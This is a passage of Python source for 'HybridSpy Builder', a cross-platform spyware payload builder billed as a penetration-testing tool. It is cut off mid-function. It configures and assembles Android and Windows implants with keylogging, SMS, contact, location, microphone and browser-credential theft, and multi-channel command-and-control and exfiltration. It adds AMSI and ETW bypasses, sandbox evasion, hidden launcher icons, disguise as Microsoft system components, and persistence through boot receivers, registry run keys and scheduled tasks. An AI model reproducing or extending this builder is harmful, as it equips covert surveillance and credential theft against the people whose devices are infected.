#!/usr/bin/env python3
"""
HybridSpy Builder v3.0.0 — Production Grade
Cross-platform payload builder for authorized penetration testing.
Idempotent · Parallel · Scalable · Robust · Error-Isolated

Architecture:
  - Stage-based pipeline with independent error boundaries
  - Deterministic incremental builds via content-addressed cache
  - Parallel compilation across platforms with controlled concurrency
  - Automatic rollback on failure (atomic output directories)
  - Comprehensive pre-flight validation before any file write
"""

import argparse
import asyncio
import concurrent.futures
import hashlib
import json
import logging
import os
import secrets
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import traceback
from contextlib import contextmanager, suppress
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum, auto
from pathlib import Path
from threading import Lock
from typing import Dict, List, Optional, Set, Tuple, Callable, Any
from xml.etree import ElementTree as ET

import yaml
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ─── Constants ───────────────────────────────────────────────────────────────

PROJECT_ROOT = Path(__file__).resolve().parent.parent
BUILDER_DIR = Path(__file__).resolve().parent
MODULES_DIR = BUILDER_DIR / "modules"
RESOURCES_DIR = BUILDER_DIR / "resources"
OUTPUT_DIR = BUILDER_DIR / "output"
PAYLOAD_DIR = PROJECT_ROOT / "Payload"
TEMPLATES_DIR = RESOURCES_DIR / "templates"
CACHE_DIR = BUILDER_DIR / ".build_cache"
BUILD_METADATA_DIR = BUILDER_DIR / ".build_metadata"

MAX_CONCURRENT_BUILDS = 4
SUBPROCESS_TIMEOUT_SECONDS = 300
REQUIRED_BINARIES = {
    "android": ["java", "aapt2", "d8", "apksigner", "zipalign"],
    "windows": ["pyinstaller"],
}
KNOWN_VM_ARTIFACTS = [
    "vmtoolsd", "vboxservice", "xenservice", "qemu-ga",
    "VBoxGuest", "vmci", "vmmouse",
]

# ─── Logging ─────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("HybridSpy.Builder")


# ─── Custom Exceptions ───────────────────────────────────────────────────────

class BuildError(Exception):
    """Base exception for build pipeline failures."""
    def __init__(self, message: str, stage: str, recoverable: bool = False):
        self.stage = stage
        self.recoverable = recoverable
        super().__init__(f"[{stage}] {message}")

class ConfigError(BuildError):
    """Configuration validation error."""
    def __init__(self, message: str):
        super().__init__(message, "config", recoverable=False)

class ModuleError(BuildError):
    """Module selection/injection error."""
    def __init__(self, message: str, recoverable: bool = True):
        super().__init__(message, "module", recoverable=recoverable)

class CompilationError(BuildError):
    """Compilation/linking error."""
    def __init__(self, message: str, recoverable: bool = False):
        super().__init__(message, "compilation", recoverable=recoverable)


# ─── Enums ───────────────────────────────────────────────────────────────────

class BuildStage(Enum):
    VALIDATE = auto()
    ASSEMBLE = auto()
    COMPILE = auto()
    PACKAGE = auto()
    SIGN = auto()
    DISGUISE = auto()
    VERIFY = auto()


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class BuildConfig:
    """Parsed and validated build configuration. Immutable after creation."""
    system_name: str = "HybridSpy"
    system_version: str = "3.0.0"
    
    # C2
    c2_primary: str = "https"
    c2_backup_channels: List[str] = field(default_factory=lambda: ["dns", "telegram", "websocket"])
    c2_https_worker: str = ""
    c2_https_beacon: str = "/v3/collect"
    c2_https_exfil: str = "/v3/upload"
    c2_https_poll: str = "/v3/tasks"
    c2_dns_domain: str = ""
    c2_telegram_token: str = ""
    c2_telegram_chat: str = ""
    c2_ws_server: str = ""
    
    # Encryption
    master_key: bytes = field(default_factory=lambda: AESGCM.generate_key(bit_length=256))
    master_key_hex: str = ""
    pbkdf2_iterations: int = 600000
    
    # Android
    android_package: str = "com.android.system.security"
    android_app_name: str = "System Security Service"
    android_min_sdk: int = 26
    android_target_sdk: int = 33
    android_icon: str = ""
    
    # Windows
    windows_binary: str = "RuntimeBroker.exe"
    windows_internal: str = "WindowsRuntimeManager"
    windows_description: str = "Microsoft Windows Runtime Manager"
    windows_company: str = "Microsoft Corporation"
    windows_icon: str = ""
    
    # Feature flags
    android_keylogger: bool = True
    android_sms: bool = True
    android_contacts: bool = True
    android_call_logs: bool = True
    android_location: bool = True
    android_mic: bool = True
    android_camera: bool = False
    android_browser: bool = True
    android_device_info: bool = True
    android_clipboard: bool = True
    
    windows_keylogger: bool = True
    windows_browser_creds: bool = True
    windows_wifi: bool = True
    windows_doc_scanner: bool = True
    windows_screenshots: bool = True
    windows_mic: bool = True
    windows_webcam: bool = False
    windows_clipboard: bool = True
    windows_cred_manager: bool = True
    windows_system_info: bool = True
    
    # Stealth
    hide_launcher: bool = True
    silent_notification: bool = True
    sandbox_evasion: bool = True
    amsi_bypass: bool = True
    etw_bypass: bool = True
    com_hijack: bool = False
    process_masquerade: str = "svchost.exe"
    
    # Persistence
    android_boot: bool = True
    android_foreground: bool = True
    windows_registry: bool = True
    windows_task: bool = True
    
    # Beacon
    beacon_interval: int = 180
    beacon_jitter: int = 120
    offline_buffer: int = 1000
    retry_attempts: int = 3
    
    # Build
    target: str = "hybrid"
    output_dir: Path = OUTPUT_DIR
    cache_enabled: bool = True
    parallel: bool = True
    verbose: bool = False
    skip_cache: bool = False
    
    def __post_init__(self):
        """Validate config after initialization."""
        if self.master_key and not self.master_key_hex:
            self.master_key_hex = self.master_key.hex()
        
        valid_targets = {"android", "windows", "hybrid"}
        if self.target not in valid_targets:
            raise ConfigError(f"Invalid target '{self.target}'. Must be one of: {valid_targets}")
        
        if self.beacon_interval < 10:
            raise ConfigError(f"beacon_interval must be >= 10 seconds, got {self.beacon_interval}")
        
        if self.pbkdf2_iterations < 100000:
            raise ConfigError(f"pbkdf2_iterations must be >= 100000, got {self.pbkdf2_iterations}")
    
    @classmethod
    def from_yaml(cls, path: Path, overrides: Optional[Dict] = None) -> "BuildConfig":
        """Load config from YAML with optional CLI overrides. Pure function."""
        if not path.exists():
            raise ConfigError(f"Config file not found: {path}")
        
        with open(path, "r") as f:
            raw = yaml.safe_load(f)
        
        if not raw:
            raise ConfigError(f"Empty or invalid config file: {path}")
        
        kwargs = {}
        
        # System
        kwargs["system_name"] = raw.get("system", {}).get("name", "HybridSpy")
        kwargs["system_version"] = raw.get("system", {}).get("version", "3.0.0")
        
        # C2
        c2 = raw.get("c2", {})
        kwargs["c2_primary"] = c2.get("primary_channel", "https")
        kwargs["c2_backup_channels"] = c2.get("backup_channels", ["dns", "telegram", "websocket"])
        
        https = c2.get("https", {})
        kwargs["c2_https_worker"] = https.get("worker_url", "")
        kwargs["c2_https_beacon"] = https.get("beacon_path", "/v3/collect")
        kwargs["c2_https_exfil"] = https.get("exfil_path", "/v3/upload")
        kwargs["c2_https_poll"] = https.get("poll_path", "/v3/tasks")
        
        dns_cfg = c2.get("dns", {})
        kwargs["c2_dns_domain"] = dns_cfg.get("domain", "")
        
        tg = c2.get("telegram", {})
        kwargs["c2_telegram_token"] = tg.get("bot_token", "")
        kwargs["c2_telegram_chat"] = tg.get("chat_id", "")
        
        ws = c2.get("websocket", {})
        kwargs["c2_ws_server"] = ws.get("server", "")
        
        # Encryption
        enc = raw.get("encryption", {})
        key_hex = enc.get("master_key", "")
        kwargs["master_key"] = bytes.fromhex(key_hex) if key_hex else AESGCM.generate_key(bit_length=256)
        kwargs["master_key_hex"] = kwargs["master_key"].hex()
        kwargs["pbkdf2_iterations"] = enc.get("pbkdf2_iterations", 600000)
        
        # Payload names
        p = raw.get("payload", {})
        a = p.get("android", {})
        kwargs["android_package"] = a.get("package_name", "com.android.system.security")
        kwargs["android_app_name"] = a.get("app_name", "System Security Service")
        kwargs["android_min_sdk"] = a.get("min_sdk", 26)
        kwargs["android_target_sdk"] = a.get("target_sdk", 33)
        icon_file = a.get("icon", "icons/android_icon.png")
        kwargs["android_icon"] = str(RESOURCES_DIR / icon_file)
        
        w = p.get("windows", {})
        kwargs["windows_binary"] = w.get("binary_name", "RuntimeBroker.exe")
        kwargs["windows_internal"] = w.get("internal_name", "WindowsRuntimeManager")
        kwargs["windows_description"] = w.get("description", "Microsoft Windows Runtime Manager")
        kwargs["windows_company"] = w.get("company", "Microsoft Corporation")
        win_icon_file = w.get("icon", "icons/windows_icon.ico")
        kwargs["windows_icon"] = str(RESOURCES_DIR / win_icon_file)
        
        # Features - Android
        feats = raw.get("features", {})
        af = feats.get("android", {})
        kwargs["android_keylogger"] = af.get("keylogger", {}).get("enabled", True)
        kwargs["android_sms"] = af.get("sms", {}).get("enabled", True)
        kwargs["android_contacts"] = af.get("contacts", {}).get("enabled", True)
        kwargs["android_call_logs"] = af.get("call_logs", {}).get("enabled", True)
        kwargs["android_location"] = af.get("location", {}).get("enabled", True)
        kwargs["android_mic"] = af.get("microphone", {}).get("enabled", True)
        kwargs["android_camera"] = af.get("camera", {}).get("enabled", False)
        kwargs["android_browser"] = af.get("browser_data", {}).get("enabled", True)
        kwargs["android_device_info"] = af.get("device_info", {}).get("enabled", True)
        kwargs["android_clipboard"] = af.get("clipboard", {}).get("enabled", True)
        
        wf = feats.get("windows", {})
        kwargs["windows_keylogger"] = wf.get("keylogger", {}).get("enabled", True)
        kwargs["windows_browser_creds"] = wf.get("browser_credentials", {}).get("enabled", True)
        kwargs["windows_wifi"] = wf.get("wifi_passwords", {}).get("enabled", True)
        kwargs["windows_doc_scanner"] = wf.get("document_scanner", {}).get("enabled", True)
        kwargs["windows_screenshots"] = wf.get("screenshots", {}).get("enabled", True)
        kwargs["windows_mic"] = wf.get("microphone", {}).get("enabled", True)
        kwargs["windows_webcam"] = wf.get("webcam", {}).get("enabled", False)
        kwargs["windows_clipboard"] = wf.get("clipboard", {}).get("enabled", True)
        kwargs["windows_cred_manager"] = wf.get("credential_manager", {}).get("enabled", True)
        kwargs["windows_system_info"] = wf.get("system_info", {}).get("enabled", True)
        
        # Stealth
        s = raw.get("stealth", {})
        sa = s.get("android", {})
        kwargs["hide_launcher"] = sa.get("hide_launcher_icon", True)
        kwargs["silent_notification"] = sa.get("silent_notification", True)
        kwargs["sandbox_evasion"] = sa.get("sandbox_evasion", True)
        sw = s.get("windows", {})
        kwargs["process_masquerade"] = sw.get("process_masquerade", "svchost.exe")
        kwargs["amsi_bypass"] = sw.get("amsi_bypass", True)
        kwargs["etw_bypass"] = sw.get("etw_bypass", True)
        kwargs["com_hijack"] = sw.get("com_hijack", False)
        
        # Persistence
        pers = raw.get("persistence", {})
        pa = pers.get("android", {})
        kwargs["android_boot"] = pa.get("boot_receiver", True)
        kwargs["android_foreground"] = pa.get("foreground_service", True)
        pw = pers.get("windows", {})
        kwargs["windows_registry"] = pw.get("registry_run", True)
        kwargs["windows_task"] = pw.get("scheduled_task", True)
        
        # Beacon
        b = raw.get("beacon", {})
        kwargs["beacon_interval"] = b.get("interval_base", 180)
        kwargs["beacon_jitter"] = b.get("jitter_max", 120)
        kwargs["offline_buffer"] = b.get("offline_buffer_size", 1000)
        kwargs["retry_attempts"] = b.get("retry_attempts", 3)
        
        # CLI overrides
        if overrides:
            for k, v in overrides.items():
                if k in kwargs and v is not None:
                    kwargs[k] = v
        
        return cls(**kwargs)
    
    def to_cache_dict(self) -> Dict:
        """Serialize to dict for cache key generation (excludes runtime fields)."""
        d = asdict(self)
        d["master_key"] = self.master_key_hex  # Use hex string for hashing
        d["output_dir"] = str(self.output_dir)
        return d


@dataclass
class BuildResult:
    """Immutable result of a build operation. Appended to, never mutated."""
    success: bool
    target: str
    output_paths: List[Path] = field(default_factory=list)
    checksums: Dict[str, str] = field(default_factory=dict)
    build_time: float = 0.0
    errors: List[str] = field(default_factory=list)
    warnings: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)
    stages_completed: List[str] = field(default_factory=list)
    
    def merge(self, other: "BuildResult") -> "BuildResult":
        """Merge another BuildResult into this one (for hybrid builds)."""
        return BuildResult(
            success=self.success and other.success,
            target=f"{self.target}+{other.target}",
            output_paths=self.output_paths + other.output_paths,
            checksums={**self.checksums, **other.checksums},
            build_time=max(self.build_time, other.build_time),
            errors=self.errors + other.errors,
            warnings=self.warnings + other.warnings,
            metadata={**self.metadata, **other.metadata},
            stages_completed=self.stages_completed + other.stages_completed,
        )


# ─── Crypto Engine ───────────────────────────────────────────────────────────

class CryptoEngine:
    """Thread-safe cryptographic operations with hardware acceleration."""
    
    _lock = Lock()
    
    @staticmethod
    def generate_key() -> bytes:
        return AESGCM.generate_key(bit_length=256)
    
    @staticmethod
    def encrypt(plaintext: bytes, key: bytes) -> bytes:
        """Encrypt with AES-256-GCM. Returns nonce + ciphertext."""
        if not plaintext:
            raise ValueError("Cannot encrypt empty plaintext")
        if len(key) != 32:
            raise ValueError(f"Key must be 32 bytes, got {len(key)}")
        
        aesgcm = AESGCM(key)
        nonce = secrets.token_bytes(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        return nonce + ciphertext
    
    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        """Decrypt AES-256-GCM data. Expects nonce + ciphertext."""
        if len(data) < 13:
            raise ValueError(f"Ciphertext too short: {len(data)} bytes (need >= 13)")
        if len(key) != 32:
            raise ValueError(f"Key must be 32 bytes, got {len(key)}")
        
        aesgcm = AESGCM(key)
        nonce, ciphertext = data[:12], data[12:]
        return aesgcm.decrypt(nonce, ciphertext, None)
    
    @staticmethod
    def derive_key(master_key: bytes, salt: bytes, iterations: int = 600000) -> bytes:
        """Derive a 32-byte key using PBKDF2-HMAC-SHA256."""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=iterations,
        )
        return kdf.derive(master_key)
    
    @staticmethod
    def hash_file(path: Path) -> str:
        """SHA-256 hash of file contents. Memory-efficient for large files."""
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()
    
    @staticmethod
    def hash_bytes(data: bytes) -> str:
        return hashlib.sha256(data).hexdigest()


# ─── Module Manager ──────────────────────────────────────────────────────────

class ModuleManager:
    """Discovers, validates, and selects modules for injection.
    
    Thread-safe after initialization. Modules are discovered once and cached.
    Selection is a pure function of config + target.
    """
    
    def __init__(self, config: BuildConfig):
        self.config = config
        self.modules_dir = MODULES_DIR
        self._module_cache: Dict[str, Dict[str, Dict]] = {}
        self._lock = Lock()
        
    def discover_modules(self) -> Dict[str, Dict[str, Dict]]:
        """Discover all available modules with metadata. Thread-safe, cached."""
        if self._module_cache:
            return self._module_cache
            
        with self._lock:
            # Double-check after acquiring lock
            if self._module_cache:
                return self._module_cache
                
            modules: Dict[str, Dict[str, Dict]] = {
                "android": {},
                "windows": {},
                "shared": {},
            }
            
            for platform in ["android", "windows", "shared"]:
                platform_dir = self.modules_dir / platform
                if not platform_dir.exists():
                    log.warning(f"Module directory not found: {platform_dir}")
                    continue
                    
                for category_dir in sorted(platform_dir.iterdir()):
                    if not category_dir.is_dir():
                        continue
                    for module_file in sorted(category_dir.glob("*.py")):
                        mod_name = module_file.stem
                        # Fully-qualified name prevents collision between platforms
                        fq_name = f"{platform}.{category_dir.name}.{mod_name}"
                        rel_path = module_file.relative_to(self.modules_dir)
                        
                        modules[platform][mod_name] = {
                            "path": module_file,
                            "platform": platform,
                            "category": category_dir.name,
                            "name": mod_name,
                            "fq_name": fq_name,
                            "rel_path": str(rel_path),
                            "size": module_file.stat().st_size,
                            "mtime": module_file.stat().st_mtime,
                        }
            
            self._module_cache = modules
            log.debug(f"Discovered {sum(len(v) for v in modules.values())} modules")
            return modules
    
    def get_selected_modules(self, target: str) -> Dict[str, List[Dict]]:
        """Get list of modules to include based on config + target.
        
        Pure function — no side effects. Returns module metadata only.
        """
        all_mods = self.discover_modules()
        selected: Dict[str, List[Dict]] = {
            "android": [],
            "windows": [],
            "shared": [],
        }
        
        # Always include all shared modules
        selected["shared"] = list(all_mods.get("shared", {}).values())
        
        if target in ("android", "hybrid"):
            selected["android"] = self._filter_modules(
                all_mods.get("android", {}), "android"
            )
        
        if target in ("windows", "hybrid"):
            selected["windows"] = self._filter_modules(
                all_mods.get("windows", {}), "windows"
            )
        
        # Validate no naming collisions after filtering
        self._validate_no_collisions(selected)
        
        return selected
    
    def _filter_modules(self, modules: Dict[str, Dict], platform: str) -> List[Dict]:
        """Filter modules based on feature flags with proper dependency resolution.
        
        FIXED: process_masquerade, com_hijack now properly handled as special cases.
        """
        FEATURE_MAP: Dict[str, Dict] = {
            "android": {
                "sms_collector": "android_sms",
                "contacts_collector": "android_contacts",
                "call_log_collector": "android_call_logs",
                "location_collector": "android_location",
                "browser_data": "android_browser",
                "device_info": "android_device_info",
                "microphone": "android_mic",
                "camera": "android_camera",
                "clipboard": "android_clipboard",
                "accessibility_keylogger": "android_keylogger",
                "boot_receiver": "android_boot",
                "foreground_service": "android_foreground",
                "alarm_manager": "android_foreground",
                "icon_hider": "hide_launcher",
                "notification_suppressor": "silent_notification",
                "sandbox_evasion": "sandbox_evasion",
            },
            "windows": {
                "browser_credentials": "windows_browser_creds",
                "wifi_passwords": "windows_wifi",
                "document_scanner": "windows_doc_scanner",
                "system_info": "windows_system_info",
                "credential_manager": "windows_cred_manager",
                "microphone": "windows_mic",
                "webcam": "windows_webcam",
                "screenshot": "windows_screenshots",
                "clipboard_monitor": "windows_clipboard",
                "userland_keylogger": "windows_keylogger",
                "registry_run": "windows_registry",
                "scheduled_task": "windows_task",
                "com_hijack": "com_hijack",
                "process_masquerade": "process_masquerade",  # FIXED: was None
                "amsi_bypass": "amsi_bypass",
                "etw_bypass": "etw_bypass",
                "sandbox_evasion": "sandbox_evasion",
            },
        }
        
        feature_map = FEATURE_MAP.get(platform, {})
        result: List[Dict] = []
        skipped: List[str] = []
        
        for mod_name, mod_data in modules.items():
            if mod_name not in feature_map:
                # Unknown module — include it with a warning
                result.append(mod_data)
                continue
                
            feature_attr = feature_map[mod_name]
            
            # Special case: process_masquerade and com_hijack are strings, not bools
            if feature_attr in ("process_masquerade", "com_hijack"):
                attr_val = getattr(self.config, feature_attr, "")
                if attr_val:  # Include if non-empty string
                    result.append(mod_data)
                else:
                    skipped.append(mod_name)
                continue
            
            # Boolean feature flags
            if isinstance(feature_attr, str) and hasattr(self.config, feature_attr):
                if getattr(self.config, feature_attr, False):
                    result.append(mod_data)
                else:
                    skipped.append(mod_name)
            else:
                # Attribute doesn't exist — include by default
                result.append(mod_data)
        
        if skipped:
            log.debug(f"Skipped {platform} modules: {', '.join(skipped)}")
        
        return result
    
    def _validate_no_collisions(self, selected: Dict[str, List[Dict]]):
        """Validate that module file names don't collide after flattening.
        
        FIXED: Raises ModuleError if collisions detected, preventing silent overwrites.
        """
        seen: Dict[str, List[str]] = {}
        
        for platform, mods in selected.items():
            for mod in mods:
                dst_name = mod["name"] + ".py"
                if dst_name in seen:
                    prev = seen[dst_name]
                    raise ModuleError(
                        f"Module name collision: '{mod['fq_name']}' and '{prev[0]}' "
                        f"both map to '{dst_name}'. Use unique module names."
                    )
                seen[dst_name] = [mod["fq_name"], platform]
        
        # Also check collision with payload core files
        core_files = {"hybrid_core.py", "platform_selector.py", "config_loader.py"}
        for dst_name in seen:
            if dst_name in core_files:
                raise ModuleError(
                    f"Module name collision with core payload file: '{dst_name}'. "
                    f"Rename the module."
                )


# ─── Build Cache ─────────────────────────────────────────────────────────────

class BuildCache:
    """Idempotent build cache with content-addressed keys.
    
    Thread-safe. Cache entries are immutable once written.
    Automatically invalidated when any input (config, modules, templates) changes.
    """
    
    def __init__(self, config: BuildConfig):
        self.config = config
        self.cache_dir = CACHE_DIR
        self.metadata_dir = BUILD_METADATA_DIR
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        self.metadata_dir.mkdir(parents=True, exist_ok=True)
        self._lock = Lock()
        
    def get_cache_key(self, target: str, modules: List[Path]) -> str:
        """Generate a deterministic cache key from config + module contents.
        
        Uses content-addressing: same inputs → same key → cache hit.
        FIXED: Uses fully-qualified module paths to prevent collisions.
        """
        h = hashlib.sha256()
        
        # Target identifier
        h.update(target.encode())
        
        # Config hash (sorted keys = deterministic)
        config_dict = self.config.to_cache_dict()
        config_bytes = json.dumps(config_dict, sort_keys=True, ensure_ascii=False).encode()
        h.update(config_bytes)
        
        # Module content hashes (sorted by fq_name = deterministic)
        for mod_path in sorted(modules, key=lambda p: str(p)):
            with suppress(FileNotFoundError):
                with open(mod_path, "rb") as f:
                    h.update(f.read())
            h.update(str(mod_path).encode())
        
        # Template hashes
        if TEMPLATES_DIR.exists():
            for tpl in sorted(TEMPLATES_DIR.iterdir()):
                if tpl.is_file():
                    with suppress(FileNotFoundError):
                        with open(tpl, "rb") as f:
                            h.update(f.read())
        
        return h.hexdigest()
    
    def is_cached(self, target: str, cache_key: str) -> bool:
        """Check if a build is already cached. Thread-safe."""
        if not self.config.cache_enabled or self.config.skip_cache:
            return False
            
        metadata_file = self.metadata_dir / f"{target}_build.json"
        if not metadata_file.exists():
            return False
            
        try:
            with open(metadata_file) as f:
                meta = json.load(f)
            return meta.get("cache_key") == cache_key and meta.get("success", False)
        except (json.JSONDecodeError, KeyError, FileNotFoundError):
            return False
    
    def save_metadata(self, target: str, cache_key: str, result: BuildResult):
        """Save build metadata for cache validation. Thread-safe."""
        metadata = {
            "cache_key": cache_key,
            "success": result.success,
            "build_time": result.build_time,
            "timestamp": datetime.utcnow().isoformat(),
            "target": target,
            "outputs": [str(p) for p in result.output_paths],
            "checksums": result.checksums,
            "errors": result.errors,
            "warnings": result.warnings,
            "stages_completed": result.stages_completed,
            "python_version": sys.version,
        }
        
        metadata_file = self.metadata_dir / f"{target}_build.json"
        with self._lock:
            # Atomic write via temp file + rename
            tmp_file = metadata_file.with_suffix(".tmp")
            with open(tmp_file, "w") as f:
                json.dump(metadata, f, indent=2, default=str)
            tmp_file.rename(metadata_file)


# ─── Config Embedder ─────────────────────────────────────────────────────────

class ConfigEmbedder:
    """Encrypts and embeds runtime configuration into payload binaries.
    
    The embedded config is device-bound: it includes a salt derived from
    the master key + random salt, so each build produces a unique config blob
    even with identical settings (defeats config fingerprinting).
    """
    
    def __init__(self, config: BuildConfig):
        self.config = config
        
    def build_embedded_config(self) -> bytes:
        """Build the runtime configuration blob (encrypted JSON).
        
        Format: [4-byte salt_len][16-byte salt][encrypted JSON]
        The JSON is minified with sorted keys for deterministic output.
        """
        config_dict = {
            "v": self.config.system_version,
            "c2": {
                "p": self.config.c2_primary,
                "b": self.config.c2_backup_channels,
                "h": {
                    "u": self.config.c2_https_worker,
                    "b": self.config.c2_https_beacon,
                    "e": self.config.c2_https_exfil,
                    "p": self.config.c2_https_poll,
                },
                "d": {"d": self.config.c2_dns_domain},
                "t": {"t": self.config.c2_telegram_token, "c": self.config.c2_telegram_chat},
                "w": {"s": self.config.c2_ws_server},
            },
            "enc": {
                "i": self.config.pbkdf2_iterations,
            },
            "beacon": {
                "i": self.config.beacon_interval,
                "j": self.config.beacon_jitter,
                "b": self.config.offline_buffer,
                "r": self.config.retry_attempts,
            },
            "stealth": {
                "se": self.config.sandbox_evasion,
                "pm": self.config.process_masquerade,
                "ch": self.config.com_hijack,
            },
            "feats": {
                "ak": self.config.android_keylogger,
                "al": self.config.android_location,
                "am": self.config.android_mic,
                "ac": self.config.android_clipboard,
                "wk": self.config.windows_keylogger,
                "wb": self.config.windows_browser_creds,
                "ws": self.config.windows_screenshots,
                "wm": self.config.windows_mic,
                "wc": self.config.windows_clipboard,
            },
        }
        
        payload = json.dumps(config_dict, separators=(",", ":"), sort_keys=True).encode("utf-8")
        
        # Generate config-specific salt and derive config key
        salt = secrets.token_bytes(16)
        config_key = CryptoEngine.derive_key(
            self.config.master_key, salt, self.config.pbkdf2_iterations
        )
        encrypted = CryptoEngine.encrypt(payload, config_key)
        
        # Format: [4-byte salt_len][16-byte salt][encrypted data]
        salt_len = len(salt).to_bytes(4, "big")
        return salt_len + salt + encrypted
    
    @staticmethod
    def extract_embedded_config(data: bytes, master_key: bytes, iterations: int = 600000) -> Dict:
        """Extract and decrypt embedded config.
        
        FIXED: Static method that takes master_key explicitly, avoiding
        the bug where the instance's key might differ from the embed key.
        """
        if len(data) < 20:  # 4 (len) + 16 (salt) + at least 13 (nonce+cipher)
            raise ValueError(f"Config blob too short: {len(data)} bytes")
        
        salt_len = int.from_bytes(data[:4], "big")
        if salt_len != 16:
            raise ValueError(f"Unexpected salt length: {salt_len}")
        
        salt = data[4:4 + salt_len]
        encrypted = data[4 + salt_len:]
        
        config_key = CryptoEngine.derive_key(master_key, salt, iterations)
        decrypted = CryptoEngine.decrypt(encrypted, config_key)
        return json.loads(decrypted.decode("utf-8"))


# ─── Stage Runner (Atomic Build Stages) ──────────────────────────────────────

class StageRunner:
    """Executes build stages with error isolation, timeouts, and rollback.
    
    Each stage is an independent transaction. If a stage fails, its partial
    output is discarded. Previous stages' outputs are preserved.
    """
    
    def __init__(self, build_dir: Path, stage_timeout: int = SUBPROCESS_TIMEOUT_SECONDS):
        self.build_dir = build_dir
        self.stage_timeout = stage_timeout
        
    @contextmanager
    def stage(self, name: str, stage_dir: Optional[Path] = None):
        """Context manager for a build stage.
        
        Creates a temporary working directory. On success, contents are
        merged into the build directory. On failure, the temp dir is deleted.
        """
        work_dir = tempfile.mkdtemp(dir=self.build_dir, prefix=f".stage_{name}_")
        stage_path = Path(work_dir)
        
        try:
            log.debug(f"Starting stage '{name}' in {stage_path}")
            yield stage_path
            # Merge contents into build_dir on success
            self._merge_dirs(stage_path, stage_dir or self.build_dir)
            log.debug(f"Stage '{name}' completed")
        except Exception as e:
            log.error(f"Stage '{name}' failed: {e}")
            raise
        finally:
            # Clean up temp dir
            shutil.rmtree(stage_path, ignore_errors=True)
    
    def _merge_dirs(self, src: Path, dst: Path):
        """Merge src directory into dst. Existing files are overwritten."""
        dst.mkdir(parents=True, exist_ok=True)
        for item in src.iterdir():
            dst_item = dst / item.name
            if item.is_dir():
                self._merge_dirs(item, dst_item)
            else:
                shutil.move(str(item), str(dst_item))
    
    @staticmethod
    def run_subprocess(
        cmd: List[str],
        cwd: Optional[Path] = None,
        timeout: int = SUBPROCESS_TIMEOUT_SECONDS,
        env: Optional[Dict[str, str]] = None,
    ) -> Tuple[int, str, str]:
        """Run a subprocess with timeout and capture output.
        
        FIXED: Added timeout parameter to prevent hung processes.
        """
        try:
            result = subprocess.run(
                cmd,
                cwd=str(cwd) if cwd else None,
                capture_output=True,
                text=True,
                timeout=timeout,
                env={**os.environ, **(env or {})},
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            raise CompilationError(
                f"Command timed out after {timeout}s: {' '.join(cmd)}"
            )
        except FileNotFoundError:
            raise CompilationError(f"Command not found: {cmd[0]}")


# ─── Payload Assembler ───────────────────────────────────────────────────────

class PayloadAssembler:
    """Assembles payload source from templates + selected modules.
    
    Produces a complete, compilable source tree in the build directory.
    All generated code is deterministic given the same config.
    """
    
    def __init__(self, config: BuildConfig):
        self.config = config
        self.module_mgr = ModuleManager(config)
        self.config_embedder = ConfigEmbedder(config)
        self.stage_runner = StageRunner(Path(tempfile.mkdtemp(prefix="hybridspy_build_")))
        
    def assemble_android(self, build_dir: Path) -> List[Path]:
        """Assemble Android payload source tree."""
        log.info("Assembling Android payload source...")
        
        modules = self.module_mgr.get_selected_modules("android")
        
        with self.stage_runner.stage("android_assemble") as stage_dir:
            src_dir = stage_dir / "app" / "src" / "main"
            java_dir = src_dir / "java" / "com" / "android" / "system" / "security"
            res_dir = src_dir / "res"
            python_dir = src_dir / "python"
            
            for d in [
                java_dir,
                res_dir / "values",
                res_dir / "drawable",
                res_dir / "xml",
                python_dir,
                python_dir / "c2",
                python_dir / "data",
                python_dir / "utils",
            ]:
                d.mkdir(parents=True, exist_ok=True)
            
            # Generate all source files
            self._generate_android_manifest(src_dir)
            self._generate_main_activity(java_dir)
            self._generate_foreground_service(java_dir)
            self._generate_boot_receiver(java_dir)
            self._generate_python_bridge(java_dir)
            self._generate_accessibility_service(java_dir, res_dir)
            
            # Copy Python modules with deduplication
            self._copy_python_modules(modules, python_dir, "android")
            
            # Embed encrypted config
            config_blob = self.config_embedder.build_embedded_config()
            config_out = python_dir / "_config.bin"
            with open(config_out, "wb") as f:
                f.write(config_blob)
            
            # Copy icon
            if self.config.android_icon:
                icon_path = Path(self.config.android_icon)
                if icon_path.exists():
                    shutil.copy2(icon_path, res_dir / "drawable" / "ic_launcher.png")
            
            files = list(stage_dir.rglob("*"))
            log.info(f"Assembled {len(files)} Android source files")
            
        return list(build_dir.rglob("*"))
    
    def assemble_windows(self, build_dir: Path) -> List[Path]:
        """Assemble Windows payload source tree."""
        log.info("Assembling Windows payload source...")
        
        modules = self.module_mgr.get_selected_modules("windows")
        
        with self.stage_runner.stage("windows_assemble") as stage_dir:
            src_dir = stage_dir / "payload"
            
            for d in [src_dir, src_dir / "c2", src_dir / "data", src_dir / "utils"]:
                d.mkdir(parents=True, exist_ok=True)
            
            # Generate entry points
            self._generate_windows_entry(src_dir)
            self._generate_windows_service_wrapper(src_dir)
            
            # Copy Python modules with deduplication
            self._copy_python_modules(modules, src_dir, "windows")
            
            # Embed encrypted config
            config_blob = self.config_embedder.build_embedded_config()
            config_out = src_dir / "_config.bin"
            with open(config_out, "wb") as f:
                f.write(config_blob)
            
            # Generate PyInstaller spec
            self._generate_pyinstaller_spec(stage_dir, src_dir)
            
            files = list(stage_dir.rglob("*"))
            log.info(f"Assembled {len(files)} Windows source files")
        
        return list(build_dir.rglob("*"))
    
    def _copy_python_modules(
        self,
        modules: Dict[str, List[Dict]],
        target_dir: Path,
        platform: str,
    ):
        """Copy selected Python modules to target directory.
        
